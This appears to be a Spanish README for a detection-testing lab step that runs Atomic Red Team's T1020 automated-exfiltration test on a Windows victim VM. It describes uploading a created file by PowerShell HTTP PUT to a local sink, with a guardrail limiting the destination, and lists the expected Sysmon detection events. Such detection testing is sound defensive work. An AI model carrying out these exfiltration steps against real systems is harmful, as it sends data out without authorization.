# ATA056 - T1020 Automated Exfiltration (Windows, `victima-windows`)

> **B1.1 (piloto mixto).** Canal **SSH** (`lab-listo-windows-ataques-ssh`). Sin secretos.
> **ART tal cual**: atomic `T1020` -> *IcedID Botnet HTTP PUT* (`9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0`).

## Que hace

1. Crea `T1020_exfilFile.txt` (contenido de la atomica).
2. Lo sube con `Invoke-WebRequest -Method Put` a `http://192.168.65.1:9090/upload/ATA056`
   (sink HTTP del HOST, "internet local").
3. Escribe `evidencias/efecto_local.txt` (t0/t1, URL, sha256) y `evidencias/times.log`.

**Adaptacion declarada**: solo los `input_arguments` `file` y `domain` (destino local).
El comando de la atomica no cambia. Guardarrail: si la URL no es `192.168.65.1:9090`, aborta.

## Ejecucion (desde el host, por SSH)

```powershell
ssh -i <clave> angel@192.168.65.130 "cmd /c C:\lab-attack\ATA056\run.cmd"
```

## Prueba de efecto

`sink.log` del HOST con una linea `PUT /upload/ATA056 ... sha256=<hash>`; el `sha256` debe
coincidir con el del fichero enviado (se anota en `efecto.txt` de la iteracion).
La alerta **no** es prueba de efecto.

## Esperado

`ATA056_esperado.csv` (pre-registrado): `win_image` (`powershell.exe` / `cmd.exe`) + ancla
`win_command_line` con `C:\lab-attack\ATA056`. H4-W exige evento de ejecucion (Sysmon 1 / 4688).
